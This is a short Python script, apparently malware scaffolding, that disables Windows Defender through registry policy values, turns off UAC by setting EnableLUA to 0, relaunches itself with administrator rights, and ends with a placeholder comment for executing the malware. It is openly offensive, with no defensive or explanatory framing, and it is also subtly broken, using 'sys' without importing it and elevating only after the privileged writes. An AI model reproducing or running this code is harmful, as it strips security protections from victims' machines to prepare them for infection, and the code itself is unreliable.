import winreg
import os

def disable_windows_defender():
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Policies\Microsoft\Windows Defender', 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key, 'DisableAntiSpyware', 0, winreg.REG_DWORD, 1)
    winreg.SetValueEx(key, 'DisableAntiVirus', 0, winreg.REG_DWORD, 1)
    winreg.CloseKey(key)

def disable_uac():
    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System', 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key, 'EnableLUA', 0, winreg.REG_DWORD, 0)
    winreg.CloseKey(key)

def run_as_admin():
    if os.name == 'nt':
        import ctypes
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)

# Disable Windows Defender
disable_windows_defender()

# Disable UAC
disable_uac()

# Run as admin
run_as_admin()

# Execute the malware code here